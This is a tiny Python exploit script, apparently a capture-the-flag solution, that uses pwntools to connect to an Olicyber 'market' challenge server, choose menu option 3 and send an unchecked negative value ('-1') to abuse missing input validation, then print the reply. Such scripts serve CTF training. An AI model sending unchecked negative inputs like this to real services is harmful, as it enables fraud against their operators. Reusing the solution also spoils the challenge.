from pwn import *
r = remote("market.challs.olicyber.it", 10005)
r.recv()
r.sendline(b"3")
r.recv()
r.recv()
r.sendline(b"-1") # payload negativo non controllato
print(r.recv().decode().strip())
